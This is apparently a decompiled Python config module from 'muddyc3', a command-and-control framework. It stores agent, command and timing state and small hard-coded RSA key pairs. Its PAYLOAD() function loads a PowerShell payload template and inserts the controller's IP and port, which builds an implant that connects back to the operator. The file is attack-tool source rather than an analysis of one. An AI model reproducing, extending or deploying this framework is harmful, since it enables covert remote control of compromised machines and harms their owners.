# Embedded file name: core\config.py
PORT = 8080
VERSION = '1.1.1'
AGENTS = dict()
COMMAND = dict()
TIME = dict()
public_key = (479, 713)
private_key = (959, 713)
COUNT = 0
prv_key = (289, 437)
pub_key = (37, 437)
IP = ''
BASE = 'muddyc3'
POINTER = 'main'
PAYLOADS = []

def PAYLOAD():
    global IP
    global PORT
    fp = open('core/payload.ps1', 'r')
    ps1 = fp.read()
    ps1 = ps1.replace('{ip}', IP).replace('{port}', PORT)
    return ps1


def set_port(in_port):
    global PORT
    PORT = in_port


def set_count(in_count):
    global COUNT
    COUNT = in_count


def set_pointer(in_pointer):
    global POINTER
    POINTER = in_pointer


def set_ip(in_ip):
    global IP
    IP = in_ip


def set_time(id, in_time):
    TIME[id] = in_time - TIME[id]

def get_pointer():
    global POINTER
    return POINTER
